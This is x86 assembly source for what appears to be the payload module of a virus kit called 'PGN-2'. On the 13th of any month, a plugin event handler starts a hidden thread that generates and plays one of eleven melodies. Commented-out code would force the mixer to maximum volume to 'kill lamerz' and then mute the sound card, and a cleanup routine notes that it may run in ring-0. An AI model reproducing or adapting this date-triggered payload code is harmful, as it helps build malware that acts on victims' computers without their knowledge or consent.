
; *** BUILD: enable max volume set

include                 ..\..\INCLUDE\consts.inc
include                 ..\MAIN\MAIN.INC

                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

music_list              label   dword

                        dd      holms_info
                        dd      ussr_info
                        dd      beer_info
                        dd      tumen_info
                        dd      polonais_info
                        dd      lenin_info
                        dd      invader_info
                        dd      maca_info
                        dd      olexy_info
                        dd      siskin_info
                        dd      vampirus_info

music_num               equ     ($-music_list)/4

include                 MUSIC\1holms.inc
include                 MUSIC\2ussr.inc
include                 MUSIC\3beer.inc
include                 MUSIC\4tumen.inc
include                 MUSIC\5polonas.inc
include                 MUSIC\6lenin.inc
include                 MUSIC\7invader.inc
include                 MUSIC\8maca.inc
include                 MUSIC\9olexy.inc
include                 MUSIC\10siskin.inc
include                 MUSIC\11vampir.inc

wavehdr:                db      'RIFF'          ; BYTE  riff_sign[4];   // ='RIFF'
x1                      dd      ?               ; DWORD riff_size;      // filesize-8=datasize+sizeof(wavehdr)-8=datasize+50
                        db      'WAVEfmt '      ; BYTE  wavefmt_sign[8];// ='WAVEfmt '
                        dd      10h             ; DWORD wavefmt_size;   // sizeof(PCMWAVEFORMAT)=12h
                        dw      1               ; WORD  wFormatTag;     // type=WAVE_FORMAT_PCM=1
                        dw      1               ; WORD  nChannels;      // channels=1
                        dd      11025           ; DWORD nSamplesPerSec; // freq=11025/22050/44100
                        dd      22050           ; DWORD nBytesPerSec;   // bytespersecond=freq*channels*bitrate/8=176400
                        dw      2               ; WORD  nBlockAlign;    // =1/2/4
                        dw      16              ; WORD  wBitsPerSample; // =8/16
                        db      'data'          ; BYTE  data_sign[4];   // ='data'
x2                      dd      ?               ; DWORD data_size;      // =datasize
wavehdrsize             equ     $-wavehdr

mxcd:                   dd      18h             ; DWORD cbStruct
cid                     dd      ?               ; DWORD dwControlID
                        dd      2               ; DWORD cChannels
                        dd      0               ; DWORD cMultipleItems || HWND hwndOwner
                        dd      4               ; DWORD cbDetails
                        dd      offset details

details                 dd      ?               ; vol
                        dd      ?               ; vol

effect_complete         db      0

hmx                     dd      ?

time:
_Year                   dw      ?
_Month                  dw      ?
_DayOfWeek              dw      ?
_Day                    dw      ?
_Hour                   dw      ?
_Minute                 dw      ?
_Second                 dw      ?
_Milliseconds           dw      ?

music_ptr               dd      ?
mode1                   db      ?
mode2                   db      ?

tid                     dd      ?
thandle                 dd      ?

IFDEF   EXE
argc                    dd      ?
argv0                   db      260 dup (?)
argv1                   db      260 dup (?)
argv2                   db      260 dup (?)
argv3                   db      260 dup (?)
argv4                   db      260 dup (?)
ENDIF

                        .code

HandleEvent:            mov     eax, [esp+4]    ; event_id

                        cmp     eax, EV_MAIN_IDLE
                        je      __effect

__return_0:             xor     eax, eax
                        retn

__effect:
                        push    offset time
                        callW   GetSystemTime

;                       cmp     _DayOfWeek, 5   ; friday?
;                       jne     __return_0
                        cmp     _Day, 13
                        jne     __return_0

                        cmp     effect_complete, 0
                        jne     __return_0
                        inc     effect_complete

                        push    offset tid
                        push    0
                        push    0
                        push    offset effect_thread
                        push    65536
                        push    0
                        callW   CreateThread
                        mov     thandle, eax

                        mov     eax, 1
                        retn

effect_thread:          pusha

                        callW   GetTickCount

                        shr     eax, 1
                        setc    mode1
                        shr     eax, 1
                        setc    mode2

                        mov     ecx, music_num
                        xor     edx, edx
                        div     ecx
                        mov     eax, music_list[edx*4]
                        mov     music_ptr, eax

;                       mov     esi, 65535      ; max volume (kill lamerz!)
;                       call    setvolume

                        call    effect_1

;                       xor     esi, esi        ; disable sb
;                       call    setvolume

                        popa
                        retn

; input: EAX=volume (0..FFFF)

setvolume:              pusha

                        lea     edi, details
                        cld
                        stosd
                        stosd

                        push    0               ; mixerOpen: DWORD fdwOpen
                        push    0               ; mixerOpen: DWORD dwInstance
                        push    0               ; mixerOpen: DWORD dwCallback
                        push    0               ; mixerOpen: UINT uMxId
                        push    offset hmx      ; mixerOpen: LPHMIXER phmx
                        callW   mixerOpen

                        mov     cid, 100

__cycle:                push    0               ; DWORD fdwDetails
                        push    offset mxcd     ; LPMIXERCONTROLDETAILS pmxcd
                        push    hmx             ; HMIXEROBJ hmxobj
                        callW   mixerSetControlDetails

                        dec     cid
                        jns     __cycle

                        push    hmx
                        callW   mixerClose

                        popa
                        retn

effect_1:               pusha

                        mov     eax, music_ptr
                        mov     eax, [eax+0]   ; wave_length, [sec]
                        imul    eax, 22050     ; bytes per second
                        mov     x2, eax
                        add     eax, wavehdrsize-8
                        mov     x1, eax
                        add     eax, 8

                        push    eax
                        push    40h      ; zerofill
                        callW   GlobalAlloc
                        xchg    edi, eax

IFDEF EXE
                        call    dump_msg
                        db      'þ generating WAVeform...',13,10,0
ENDIF

                        call    gen_music

IFDEF EXE
                        call    dump_msg
                        db      'þ playing, press Ctrl-C to exit',13,10,0
ENDIF

                        push    SND_MEMORY      ; SND_ASYNC+SND_LOOP
                        push    0
                        push    edi
                        callW   PlaySound

                        push    edi
                        callW   GlobalFree

                        popa
                        retn

gen_music:              pusha
                        cld

                        lea     esi, wavehdr
                        mov     ecx, wavehdrsize
                        rep     movsb

                        mov     edx, music_ptr
                        xor     ebp, ebp

__cycle:                mov     eax, [edx+8]    ; snd_freq
                        movzx   ebx, byte ptr [eax+ebp]
                        mov     eax, [edx+12]   ; snd_freq_table
                        movzx   ebx, word ptr [eax+ebx*2]
                        mov     eax, [edx+16]   ; snd_delay
                        movzx   ecx, byte ptr [eax+ebp]
                        mov     eax, [edx+20]   ; snd_delay_table
                        movzx   ecx, word ptr [eax+ecx*2]
                        mov     esi, 32000
                        call    gen_note

                        inc     ebp
                        cmp     ebp, [edx+4]    ; snd_notes
                        jb      __cycle

                        popa
                        retn

; action: generate single note, waveform=sin(t)
; input:  EBX=note frequency [Hz]
;         ECX=note length    [ms]
;         ESI=amplitude      0..32767
;         EDI=data ptr
; modify: EDI

gen_note:               pusha
                        imul    ecx, 11025/1000
                        mov     [esp].pusha_ecx, ecx
                        finit
__cycle:
; change freq effect. remove this shit to play in normal mode
                        cmp     mode1, 0
                        je      __skip1
                        mov     ebx, ecx
                        and     ebx, 3
                        mov     eax, ecx
                        shr     eax, 5
                        xor     ebx, eax
                        add     ebx, [esp].pusha_ebx
__skip1:

; EAX <-- ECX*freq/WAVE_FREQ*Pi*2
                        mov     eax, ecx
                        imul    eax, ebx
                        push    eax
                        fild    dword ptr [esp]
                        fldpi
                        fmul
                        push    11025/2
                        fild    dword ptr [esp]
                        pop     eax
                        fdiv
; EAX <-- sin(EAX) * WAVE_AMP
                        fsin
                        fild    [esp+4].pusha_esi
                        fmul
                        fistp   dword ptr [esp]
                        pop     eax

; chan1=EAX*ECX/ECX0
                        cmp     mode2, 0
                        je      __skip2
                        imul    eax, ecx              ; not fading - effect
                        push    eax
                        fild    dword ptr [esp]
                        fild    [esp+4].pusha_ecx
                        fdiv
                        fistp   dword ptr [esp]
                        pop     eax
__skip2:
                        add     ax, [edi]    ; allow superposition
                        stosw

                        loop    __cycle

                        mov     [esp].popa_edi, edi     ; update EDI
                        popa
                        retn

IFDEF   EXE

start:                  call    dump_msg
                        db      'PGN-2 Project -- Sound Effect Demo',13,10,0

                        call    getcmdline

                        cmp     argc, 4
                        jne     __x1

                        mov     eax, dword ptr argv1
                        xor     edx, edx
__cycle:                sub     al, '0'
                        cmp     al, 9
                        ja      __x1
                        imul    edx, 10
                        movzx   ecx, al
                        add     edx, ecx
                        shr     eax, 8
                        jnz     __cycle

                        dec     edx     ; 'coz 1-based
                        cmp     edx, music_num
                        jae     __x1
                        mov     eax, music_list[edx*4]
                        mov     music_ptr, eax

                        movzx   eax, byte ptr argv2
                        sub     eax, '0'
                        cmp     eax, 1
                        ja      __x1
                        mov     mode1, al

                        movzx   eax, byte ptr argv3
                        sub     eax, '0'
                        cmp     eax, 1
                        ja      __x1
                        mov     mode2, al

                        call    effect_1

                        jmp     __x2

__x1:                   call    dump_msg
                        db      'syntax:',13,10
                        db      '  EFFECT1.EXE <N> 0/1 0/1',13,10
                        db      '               |   |   `-- kind of legato/staccato',13,10
                        db      '               |   `------ waveform: 0=sin(t)',13,10
                        db      '               `---------- melody #, 1..11',13,10, 0

__x2:                   push    -1
                        callW   ExitProcess

include                 ..\..\INCLUDE\console.inc
include                 ..\..\INCLUDE\cmdline.inc


ELSE   ;!EXE

start:                  retn

ENDIF  ;EXE

unload:                 cmp     thandle, 0    ; important check, 'coz
                        je      rt            ; may be called in ring-0
                        push    0
                        push    thandle
                        callW   TerminateThread
rt:
                        xor     eax, eax
                        retn


                        end     start
